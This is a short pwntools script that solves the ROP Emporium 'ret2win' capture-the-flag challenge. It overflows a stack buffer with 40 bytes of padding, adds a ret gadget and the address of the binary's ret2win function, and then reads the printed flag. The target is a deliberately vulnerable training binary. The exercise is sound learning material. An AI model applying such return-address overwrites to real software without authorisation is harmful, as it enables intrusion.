# https://ropemporium.com/challenge/ret2win.html
from pwn import *

# from gdb with cyclic pattern, the rip offset is 40
# there is a function named 'ret2win' at 0x400756 (ASLR is off)

# set the terminal to use
context.terminal = ["gnome-terminal", "--"]

# open connection with the binary
# shell = gdb.debug("./ret2win", "continue")
shell = process("./ret2win")

payload  = b"A" * 40     # offset to rip
payload += p64(0x40053e) # ret
payload += p64(0x400756) # address of ret2win()

shell.sendlineafter(b"> ", payload)
shell.recvuntil(b"Here's your flag:\n")
flag = shell.recvline().decode().strip()
log.info(f"Flag: {flag}")

shell.close()
